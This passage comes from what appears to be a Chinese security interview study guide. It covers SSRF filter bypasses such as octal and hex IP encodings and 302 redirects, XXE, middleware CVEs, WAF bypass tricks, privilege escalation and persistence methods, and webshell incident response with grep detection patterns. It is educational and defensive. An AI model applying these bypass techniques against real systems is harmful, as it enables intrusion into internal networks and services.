<li>利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 <a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io">127.0.0.1.xip.io</a>，可以解析为127.0.0.1</li>
<li>采用进制转换，127.0.0.1 八进制：<strong><code>0177.0.0.1</code></strong>；十六进制：<strong><code>0x7f.0.0.1</code></strong>；十进制：<strong><code>2130706433</code></strong></li>
<li>利用**<code>[::]</code>，<code>http://[::]:80/</code>** 会解析为 <strong><code>http://127.0.0.1</code></strong></li>
<li>添加端口号，<a target="_blank" rel="noopener" href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></li>
<li>利用句号，如**<code>127。0。0。1</code>** 会解析为 127.0.0.1</li>
<li>采用302跳转</li>
<li>特殊数字字符</li>
</ul>
<h3 id="4-危害">4&gt;危害:</h3>
<ol>
<li><strong>对外网、服务器所在内网、本地进行端口扫描</strong></li>
<li><strong>向内部任意主机的任意端口发送payload来攻击内网服务</strong></li>
<li><strong>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</strong></li>
<li><strong>攻击内网的web应用，如直接SQL注入、XSS攻击等</strong></li>
<li><strong>利用file、gopher、dict协议读取本地文件、执行命令等</strong></li>
<li><strong>可以无视网站CDN</strong></li>
</ol>
<h3 id="5-防范-2">5&gt;防范:</h3>
<ul>
<li><strong>禁止跳转</strong></li>
<li><strong>过滤返回的信息</strong></li>
</ul>
<blockquote>
<p>如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</blockquote>
<ul>
<li><strong>统一错误信息</strong></li>
</ul>
<blockquote>
<p>避免用户可以根据错误信息来判断远程服务器的端口状态。</p>
</blockquote>
<ul>
<li><strong>限制请求的端口</strong></li>
</ul>
<blockquote>
<p>比如80,443,8080,8090。</p>
</blockquote>
<ul>
<li><strong>禁止除HTTP和HTTPS外的协议</strong></li>
</ul>
<blockquote>
<p>比如说仅仅允许http和https请求。可以防止类似于file:///,gopher://,<a href="ftp://%E8%AF%B7%E6%B1%82%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98">ftp://请求等引起的问题</a>。</p>
</blockquote>
<ul>
<li><strong>对请求地址设置白名单或者限制内网IP</strong></li>
</ul>
<h2 id="12-csrf、ssrf与xss的区别">12.csrf、ssrf与xss的区别</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss是利用用户对网站的信任进行攻击,csrf是利用浏览器对用户的信任进行攻击,这两个的攻击层面都是浏览器,ssrf是服务器对用户提供的可控URL过于信任，攻击层面是服务器</span><br></pre></td></tr></table></figure>
<p>ssrf是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<h2 id="13-XXE实体攻击有了解吗？">13.XXE实体攻击有了解吗？</h2>
<h3 id="1-原理-4">1&gt;原理:()</h3>
<p>XML 文件在引用外部实体时候，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和对内网的攻击</p>
<h3 id="2-XXE构建">2&gt;XXE构建:</h3>
<p><strong>直接通过DTD外部实体声明</strong><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/e1139fcade4e46e80e31223c9799998b.png" alt="img"></p>
<p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/4471890a133435ef40590514a1da4646.png" alt="img"></p>
<p><strong>通过DTD外部实体声明引入外部实体声明<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/bb4d962f5da7ce09d3a269f0a37c6965.png" alt="img"></strong></p>
<h3 id="3-危害-4">3&gt;危害:</h3>
<ol>
<li>任意文件读取</li>
<li>系统命令执行</li>
<li>执行远程代码</li>
<li><strong>探测内网端口</strong></li>
<li><strong>攻击内部网络</strong></li>
<li><strong>DOS拒绝服务攻击</strong></li>
<li><strong>钓鱼</strong></li>
</ol>
<h3 id="4-防范">4&gt;防范:</h3>
<p><strong>禁止使用DTD的外部声明；</strong></p>
<p>比如PHP语言中使用libxml_disable_entity_loader(true);等方式。</p>
<p>Python语言中使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>**对用户提交过来的XML数据进行过滤。**过滤如SYSTEM等敏感关键字，防止非正常、攻击性的外部实体引入操作。</p>
<h2 id="14-常见的中间件漏洞有哪些？">14.常见的中间件漏洞有哪些？</h2>
<p>其实一部分文件上传漏洞都是由于中间件造成的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1、IIS 6 解析漏洞 </span><br><span class="line">1） 当建立.asa、.asp格式的文件夹时，其目录下的任意文件都将被IIS当作为asp文件解析。</span><br><span class="line">2） 当上传文件.asp;*.jpg IIS6.0会将文件当做asp文件解析。----.php;.jpg</span><br><span class="line">2、IIS 7 解析漏洞 .jpg/.png/.php</span><br><span class="line">3、PUT任意文件解析漏洞 开启webDAV可写入权限</span><br><span class="line">4、IIS短文件名漏洞 后缀长度</span><br><span class="line"></span><br><span class="line">Apache(php中间件)</span><br><span class="line">1、addHandler导致的解析漏洞</span><br><span class="line">2、APache（2.4.0--2.4.29) HTTPD 换行解析漏(CVE-2017-15715)</span><br><span class="line">	在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</span><br><span class="line">3、未知扩展名解析漏洞 从右往左解析不认识解析下一个</span><br><span class="line">4、目录遍历</span><br><span class="line"></span><br><span class="line">Nginx(php中间件)</span><br><span class="line">1、配置文件错误导致的解析漏洞(Nginx和FastCGI处理程序不同)</span><br><span class="line">2、文件名逻辑漏洞(非法字符空格和截止符号导致Nginx状态混乱)</span><br><span class="line">3、目录遍历</span><br><span class="line">4、CRLF注入</span><br><span class="line">5、目录穿越</span><br><span class="line">(1)低版本、II7</span><br><span class="line">上传可以上传的文件，在文件地址后加上/x.php，可以让文件以php代码去执行。</span><br><span class="line">(2)文件名逻辑（0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</span><br><span class="line">我们只需要上传一个空格结尾的文件，即可使PHP解析&quot;.php &quot;</span><br><span class="line"></span><br><span class="line">Tomcat(java中间件)</span><br><span class="line">1、任意文件写入（CVE-2017-12615）</span><br><span class="line">2、远程代码执行（CVE-2019-0232）</span><br><span class="line">3、弱口令+war后门文件部署</span><br><span class="line"></span><br><span class="line">WebLogic(java中间件漏洞)</span><br><span class="line">1、弱口令+后台部署war包getshel</span><br><span class="line">2、反序列化远程代码执行漏洞（CVE-2019-2725)</span><br><span class="line">3、反序列化命令执行漏洞（CVE-2019-2725）</span><br><span class="line">4、任意文件上传漏洞（CVE-2019-2725)</span><br><span class="line">5、SSRF漏洞（CVE-2018-2894）</span><br></pre></td></tr></table></figure>
<p>20 ftp21</p>
<p>53 dns</p>
<p>443 https</p>
<p>3389 远程连接</p>
<p>80</p>
<p>445(永恒之蓝)</p>
<p>mysql 3306</p>
<p>sql server 1433</p>
<p>DB2 5000</p>
<p>redis 6379</p>
<h2 id="15-了解过WAF吗？">15.了解过WAF吗？</h2>
<p>之前遇到过一个网站你想要用BP抓包的时候会直接锁定你现在的IP,再也不能访问这个页面,后面搜了一下,</p>
<p>多了一个Connection: close头部，删除这个头部burp发包发现能收到返回包。</p>
<p>burpsuite的机制是断点处理数据，这个站他会定时的抽检数据包，然后客户端定时返回，然后如果服务端没有接收到的话，他就认为这个东西丢包了。所以我们看不到回显页面的数据包。</p>
<h3 id="概念">概念:</h3>
<p>Web应用防火墙,简称WAF,是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一种产品,一般部署在Web服务器之前,用来保护web应用.</p>
<h3 id="主要功能">主要功能:</h3>
<blockquote>
<p>WAF主要是通过内置的很多安全规则来进行防御.</p>
<p>可防护常见的SQL注入,XSS,网页篡改,中间件漏洞等OWASP TOP10攻击行</p>
<p>具有威胁感知能力,当发现攻击后,可将IP进行锁定,IP锁定之后将无法访问网站业务</p>
<p>也支持防止CC攻击,采用集中度和速率双重检测算法</p>
</blockquote>
<h3 id="不具备的功能">不具备的功能:</h3>
<p><strong>(给你加深一下 影响，防止你想不起来就乱猜)</strong></p>
<blockquote>
<ul>
<li>WAF不能过滤其他协议流量，如FTP、PoP3协议</li>
<li>WAF不能实现传统防护墙功能，如地址映射</li>
<li>WAF不能防止网络层的DDoS攻击</li>
<li>WAF不能防病毒</li>
</ul>
</blockquote>
<h2 id="16-绕过WAF的姿势？">16.绕过WAF的姿势？</h2>
<ul>
<li>通配符?*</li>
<li>大小写变种</li>
<li>内联注释/**/</li>
<li>干扰字符污染法</li>
<li>字符编码法</li>
<li>双写,嵌套,拼凑法</li>
<li>多请求拆分绕过</li>
<li>利用cookie绕过</li>
<li>利用溢量数据绕过WAF</li>
<li>云WAF绕过之寻找网站源ip</li>
</ul>
<h2 id="17-你在渗透测试中常用的工具？">17.你在渗透测试中常用的工具？</h2>
<p>FOFA</p>
<p>Burp Suite 插件</p>
<p>Xray-高级版</p>
<p>oneforall</p>
<p>灯塔水泽</p>
<p>proxifier</p>
<p>花瓶 C</p>
<p>Amass</p>
<p>Wireshark</p>
<p>dirsearch</p>
<p>AWVS</p>
<p>CS-msf</p>
<p>finall shell</p>
<p>蚁剑</p>
<p>pyinstaller.exe(杀)</p>
<p>whois信息反查</p>
<p>蓝莲花XSS平台</p>
<p>sqlmap</p>
<p>nmap</p>
<h2 id="18-使用过哪些安全设备？">18.使用过哪些安全设备？</h2>
<p>云沙箱</p>
<p>态势感知</p>
<p>火绒	腾讯安全管家	360杀毒	金山毒霸</p>
<p>宝塔</p>
<p>蜜罐</p>
<p>火绒剑</p>
<p><strong>webshell查杀</strong></p>
<blockquote>
<p><strong>D盾_Web查杀，百度WEBDIR+(在线)，河马(全平台，CloudWalker(牧云)(全平台)，Web Shell Detector(在线)，Sangfor WebShellKill(深信服)，深度学习模型检测PHP Webshell(在线)，PHP Malware Finder webshell(全平台)，findWebshell，Webshell.pub专注查杀(在线)等</strong></p>
</blockquote>
<p><strong>病毒查杀</strong></p>
<blockquote>
<p><strong>火绒，腾讯安全管家，360杀毒，Rkhunter，卡巴斯基，金山毒霸，瑞星杀毒软件，大蜘蛛，深信服EDR，Rootkit，NOD32，Clamav，virustotal等</strong></p>
</blockquote>
<p>火绒	腾讯安全管家	360杀毒	金山毒霸</p>
<p><strong>安全防护</strong></p>
<blockquote>
<p><strong>网站安全狗，创宇盾，云锁，阿里云WAF,HiHTTPS，ModSecurity，Naxsi,OpenWAF,FreeWAF，ESAPI WAF，unixhot，Java WAF，X-WAF，VeryNginx，COMODO Firewall等</strong></p>
</blockquote>
<p>宝塔</p>
<p><strong>应急响应</strong></p>
<ul>
<li></li>
</ul>
<blockquote>
<p><strong>火绒剑，微步云沙箱，Goby，PowerTool，Tcpview，PCHunter，ProcessHacker，Everything，ProcessExplorer，ProcessMonitor，XueTr，PCHunter，ProcessDump，AutoRuns，ntfsdir，FastIR，BrowsingHistoryView，sysinspector，sysinternals Suite，Index.dat Analyzer，winhex，RegistryWorkshop，DiskGenius，passrecenc，Fulleventlogview，Wsyscheck，IPOP4.1，Process monitor，Netcat，Malware Defender，MyMonitor，DllInjector，RegShot，gscan，Fodler Monitor，ResHacker，Kaspersky Virus Removal Tool ，DWirelessNetWatcher，ipradar，Fidder，ApateDNS，MiniSniffer，SysTracer等</strong></p>
</blockquote>
<p>火绒剑</p>
<h2 id="19-常见的端口和相关的服务？">19.常见的端口和相关的服务？</h2>
<p>个人感觉比较重要的</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FTP</strong></td>
<td><strong>20</strong></td>
<td>FTP服务器真正传输所用的端口，用于上传、下载</td>
</tr>
<tr>
<td><strong>FTP</strong></td>
<td><strong>21</strong></td>
<td>用于FTP的登陆认证</td>
</tr>
<tr>
<td><strong>SSH、SFTP 、</strong></td>
<td><strong>22</strong></td>
<td><code>加密</code>的远程登录，文件传输</td>
</tr>
<tr>
<td><strong>Telnet</strong></td>
<td><strong>23</strong></td>
<td>远程登录（在本地主机上使用此端口与远程服务器的22/3389端口连接）</td>
</tr>
<tr>
<td><strong>SMTP</strong></td>
<td><strong>25</strong></td>
<td>用于发送邮件</td>
</tr>
<tr>
<td><strong>DNS</strong></td>
<td><strong>53</strong></td>
<td>域名解析</td>
</tr>
<tr>
<td><strong>HTTP</strong></td>
<td><strong>80</strong></td>
<td>用于网页浏览</td>
</tr>
<tr>
<td><strong>POP3</strong></td>
<td><strong>110</strong></td>
<td>SUN公司的RPC服务所有端口</td>
</tr>
<tr>
<td><strong>HTTPS</strong></td>
<td><strong>443</strong></td>
<td><code>加密</code>的网页浏览端口</td>
</tr>
<tr>
<td><strong>sql server</strong></td>
<td><strong>1433</strong></td>
<td>Microsoft的SQL服务开放的端口 <code>数据库</code></td>
</tr>
<tr>
<td><strong>Oracle</strong></td>
<td><strong>1521</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>MySQL</strong></td>
<td><strong>3306</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>WIN2003远程登录</strong></td>
<td><strong>3389</strong></td>
<td>Windows 2000(2003) Server远程桌面的服务端口，<code>本地服务器开放</code>此端口，去连接到远程的服务器</td>
</tr>
<tr>
<td><strong>QQ·</strong></td>
<td><strong>4000</strong></td>
<td>腾讯QQ客户端开放此端口</td>
</tr>
<tr>
<td><strong>redis·</strong></td>
<td><strong>6379</strong></td>
<td>数据库</td>
</tr>
</tbody>
</table>
<p>文章中列出来</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>WebLogic</strong>*</td>
<td><strong>7001</strong></td>
<td>一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器</td>
</tr>
<tr>
<td><strong>Wingate</strong></td>
<td><strong>8010</strong></td>
<td>Wingate代理开放此端口</td>
</tr>
<tr>
<td><strong>TOMCAT</strong></td>
<td><strong>8080</strong></td>
<td>WWW代理开放此端口</td>
</tr>
<tr>
<td><strong>Network News Transfer Protocol</strong></td>
<td><strong>119</strong></td>
<td>NEWS新闻组传输协议，承载USENET通信</td>
</tr>
<tr>
<td><strong>SMTP</strong></td>
<td><strong>161</strong></td>
<td>Simple Network Management Protocol，简单网络管理协议</td>
</tr>
<tr>
<td><strong>SNMP Trap</strong></td>
<td><strong>160、162</strong></td>
<td>SNMP陷阱</td>
</tr>
<tr>
<td><strong>HTTPS</strong></td>
<td><strong>443</strong></td>
<td><code>加密</code>的网页浏览端口</td>
</tr>
<tr>
<td><strong>CIFS</strong></td>
<td><strong>445</strong></td>
<td>公共Internet文件系统</td>
</tr>
<tr>
<td><strong>NFS</strong></td>
<td><strong>2049</strong></td>
<td>通过网络，让不同的机器、不同的操作系统实现文件共享</td>
</tr>
</tbody>
</table>
<h2 id="21-为何一个mysql数据库的站，只有一个80端口开放？">21.为何一个mysql数据库的站，只有一个80端口开放？</h2>
<ul>
<li>Mysql默认端口被修改</li>
<li>站库分离</li>
<li>3306端口不对外开放</li>
</ul>
<h2 id="22-3389-远程连接-无法连接的几种情况？">22.3389(远程连接)无法连接的几种情况？</h2>
<ul>
<li>端口被修改</li>
<li>没开放3389端口</li>
<li><strong>防护拦截</strong></li>
</ul>
<blockquote>
<p><strong>1.做了tcp/ip筛选   2.终端登陆权限指定用户  3.防火墙</strong></p>
</blockquote>
<ul>
<li><strong>处于内网(需进行端口转发)</strong></li>
<li><strong>超过了服务器最大连接数</strong></li>
</ul>
<h2 id="23-判断出网站的CMS对渗透有什么意义？">23.判断出网站的CMS对渗透有什么意义？</h2>
<ul>
<li>查找已曝光的漏洞。</li>
<li>如果开源,还能下载相应的源码进行代码审计</li>
<li>根据CMS特征关联同CMS框架站点,进行敏感备份文件扫描,有肯获得站点备份文件</li>
</ul>
<h2 id="24-如何判断目标操作系统">24.如何判断目标操作系统?</h2>
<ul>
<li>大小写检测:windows大小写不敏感,linux大小写敏感</li>
<li>ping指令L:根据TTL值,windows一般情况下&gt;100,linux&lt;100(<a target="_blank" rel="noopener" href="https://www.lmlphp.com/user/64797/article/item/778238/">https://www.lmlphp.com/user/64797/article/item/778238/</a>)</li>
<li>谷歌插件 Wappalyzer</li>
</ul>
<h2 id="25-常见代码执行、文件读取、命令执行的函数有哪些">25.常见代码执行、文件读取、命令执行的函数有哪些?</h2>
<h3 id="代码执行">代码执行</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_array()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()</span><br></pre></td></tr></table></figure>
<h3 id="文件读取">文件读取</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fopen()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">fread()</span><br></pre></td></tr></table></figure>
<h3 id="命令执行">命令执行</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
<h2 id="26-木马驻留系统的方式有哪些？留后门">26.木马驻留系统的方式有哪些？留后门</h2>
<p>关联文件类型</p>
<p>计划任务</p>
<p>启动目录</p>
<p>注册表</p>
<p>服务</p>
<p>27.蚁剑/菜刀/C刀/冰蝎的相同与不相同之处？</p>
<ul>
<li><strong>相同：  都是用来连接Webshell的工具</strong></li>
<li><strong>不同：  相比于其他三款，冰蝎有流量动态加密。</strong>(<a target="_blank" rel="noopener" href="https://www.jb51.net/article/262772.htm">https://www.jb51.net/article/262772.htm</a>)</li>
</ul>
<blockquote>
<p><strong>冰蝎强特征：content-type为application/octet-stream</strong></p>
</blockquote>
<h2 id="27-内网渗透思路？">27.内网渗透思路？</h2>
<ol>
<li>代理穿透</li>
<li>权限维持</li>
<li>内网信息收集</li>
<li>口令爆破</li>
<li><strong>凭据窃取</strong></li>
<li><strong>社工</strong></li>
<li>横向和纵向渗透</li>
<li>最终目标拿下域控</li>
</ol>
<h2 id="28-Windows常用的提权方法？">28.Windows常用的提权方法？</h2>
<ul>
<li><strong>系统内核溢出漏洞提权</strong>—脏牛</li>
<li><strong>数据库提权</strong>–</li>
<li><strong>错误的系统配置提权</strong>–<a target="_blank" rel="noopener" href="https://nosec.org/m/share/3027.html">CVE-2019-1405</a></li>
<li><strong>组策略首选项提权</strong></li>
<li><strong>WEB中间件漏洞提权</strong></li>
<li><strong>DLL劫持提权</strong></li>
<li><strong>滥用高危权限令牌提权</strong></li>
<li><strong>第三方软件/服务提权等</strong></li>
</ul>
<h2 id="29-Linux常用的提权方法？">29.Linux常用的提权方法？</h2>
<p><strong>答：</strong></p>
<ul>
<li><strong>Linux内核漏洞提权</strong></li>
<li><strong>SUID提权</strong> (低权限用户目录下可被Root权限用户调用的脚本提权）</li>
<li><strong>环境变了劫持高权限程序提权</strong></li>
<li><strong>sudoer配置文件错误提权</strong></li>
</ul>
<h2 id="30-正向代理和反向代理的区别">30.正向代理和反向代理的区别?</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向代理即是客户端代理,代理客户端,服务端不知大实际发起请求的客户端</span><br><span class="line"></span><br><span class="line">反向代理即是服务端代理,代理服务端,客户端不知道实际提供服务的服务端</span><br></pre></td></tr></table></figure>
<h2 id="31-正向shell和反向shell的区别？">31.正向shell和反向shell的区别？</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向shell: 攻击者连接被攻击者机器,可用于攻击者处于内网,被攻击者处于公网的情况.</span><br><span class="line"></span><br><span class="line">反向shell: 被攻击者主动连接攻击者,可用于攻击者处于外网,被攻击者处于内网的情况.</span><br></pre></td></tr></table></figure>
<h2 id="32-序列化与反序列化的区别？">32.序列化与反序列化的区别？</h2>
<ul>
<li>序列化: 把对象转化为可传输的字节序列的过程</li>
<li>反序列化: 把字节序列转化为对象的过程</li>
</ul>
<h2 id="33-如何通过流量来分析安全事件？">33.如何通过流量来分析安全事件？</h2>
<p>**收集流量数据：**通过捕获流量来从网络中收集数据包.</p>
<p>**过滤流量：**根据事件类型和数据包的内容，需要过滤源和目标IP地址，端口，协议和时间戳等。</p>
<p>**分析流量：**收集了有关安全事件的流量数据，需要对其进行分析。这可以通过使用网络流量分析工具来完成，例如Bro/Zeek和Suricata。这些工具可以识别潜在的安全威胁并生成有关威胁的报告。</p>
<p><strong>确认威胁：分析流量后，您需要确认是否存在安全威胁。如果判断不了或者判断是真正的攻击行为立即上报</strong></p>
<p><strong>响应和修复：排查服务日志情况,查看通过什么方式修补漏洞</strong></p>
<h2 id="34-应急响应基本思路流程">34.应急响应基本思路流程</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 收集信息：收集客户信息和中毒主机信息，包括样本 </span><br><span class="line">2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断⽹、DoS 等等 </span><br><span class="line">3. 抑制范围：隔离使受害⾯不继续扩⼤ </span><br><span class="line">4. 深⼊分析：⽇志分析、进程分析、启动项分析、样本分析⽅便后期溯源 </span><br><span class="line">5. 清理处置：杀掉进程，删除⽂件，打补丁，删除异常系统服务，清除后⻔账号防⽌事件扩 ⼤，处理完毕后恢复⽣产 </span><br><span class="line">6. 产出报告：整理并输出完整的安全事件报告</span><br></pre></td></tr></table></figure>
<p>展开来说的话</p>
<h2 id="Webshell应急响应流程">Webshell应急响应流程</h2>
<h3 id="判断是否被植入webshell">判断是否被植入webshell</h3>
<p><code>系统被植入Webshell,可能出现一下几个异常</code>:</p>
<p>网页被篡改，或在网站中发现非管理员设置的内容;</p>
<p>出现攻击者恶意篡改网页或者网页被植入暗链的现象</p>
<p>安全设备报警</p>
<h4 id="临时处理">临时处理</h4>
<p>删除检测到的Webshell文件,对文件进行备份,方便后续取证溯源</p>
<p>对系统进行隔离,防止影响其他系统</p>
<p><code>扫描工具</code>:</p>
<ul>
<li>D盾</li>
</ul>
<p>Webshell 可疑文件隔离 端口进程查看 base64解码 以及克隆用户检测等 文件监控</p>
<ul>
<li>河马Webshell查杀</li>
</ul>
<p>河马Webshell拥有海量的Webshell样本和自主查杀技术,采用传统特征+云端大数据双引擎的查杀技术</p>
<h3 id="webshell查杀">webshell查杀</h3>
<h4 id="Windows系统排查">Windows系统排查</h4>
<p>利用Webshell扫描工具(如D盾)对应用部署目录进行扫描，如网站D: \WWW\目录，或者将当前网站目录文件与此前备份文件进行比对，查看是否存在新增的不一致内容，确定是否包含Webshell相关信息， 并确定Webshel位置及创建时间。然后利用文本文件打开，进一步分析发现可疑内容。</p>
<h4 id="Linux系统排查">Linux系统排查</h4>
<p>在Windows系统中使用的Webshell检测方法在Linux系统中同样适用。在Linux系统中，可用河马Webshell查杀工具扫描，也可手工搜索可能包含Webshell特征的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span><br><span class="line">find ./ type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot; </span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line">find ./ type f -name &quot;*.asp&quot; | xargs grep &quot;execute(&quot; </span><br><span class="line">find ./ type f -name &quot;*.aspx&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line"></span><br><span class="line">//对于免杀Webshell，可以查看是否使用编码</span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot; </span><br></pre></td></tr></table></figure>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="系统排查">系统排查</h3>
<p>攻击者上传Webshell后,往往还会执行进一步的操作,如提权,添加用户,写入系统后门,实现持久化驻留.因此,还需要对系统进行排查,主要排查内容如下</p>
<h4 id="Windows系统排查-2">Windows系统排查</h4>
<h5 id="用户信息排查">用户信息排查</h5>
<p><strong>用户排查:</strong></p>
<p>使用<code>net user</code>命令,可直接查看用户信息(此方法看不到隐藏用户),若发现存在非管理员使用账户,则可能为异常账户</p>
<p>如果需查看某个账户的详细信息,可以使用<code>net user username</code>命令</p>
<p><code>隐藏用户排查</code></p>
<p>打开计算机管理–&gt;本地用户和组.可查询隐藏用户.用户名称以$结尾的为隐藏用户,当然还有一种方法在github是有自动检测的工具</p>
<p><code>克隆用户排查</code></p>
<p>可使用注册表,利用F值进行对比,以排查克隆用户.也可以直接使LP_Check工具排查克隆用户</p>
<h5 id="进程、服务、驱动、启动项排查">进程、服务、驱动、启动项排查</h5>
<p><strong>进程排查:</strong></p>
<p>在排查可疑进程时，可以关注进程名称，对于异常的、不常见的名称要格外注意，另外可以重点观察进程的路径、CPU占用信息等。打开<code>系统信息</code>和<code>任务管理器</code>窗口，均可查看进程名称及其对应的执行文件。</p>
<p>进程信息还可以使用PCHunter工具查看,</p>
<p><strong>黑色条目</strong>代表微软进程</p>
<p><strong>蓝色条目</strong>代表非微软进程,可能是第三方应用程序进程,蓝色缺失文件厂商信息的几次呢需多加关注</p>
<p><strong>红色条目</strong>代表可疑进程,隐藏服务,被挂钩函数</p>
<p><strong>服务排查:</strong></p>
<p>在<code>系统信息窗口--&gt;软件环境--&gt;服务</code>,可查看服务的启动情况及其对应的启动文件</p>
<p>或使用<code>services.msc</code>命令,也可直接查看服务,查找异常服务.</p>
<p><strong>驱动,启动项排查:</strong></p>
<p>命令行<code>msconfig</code>打开启动项;</p>
<h5 id="网络连接排查">网络连接排查</h5>
<p><code>netstat -ano</code> 查看是否有可疑连接</p>
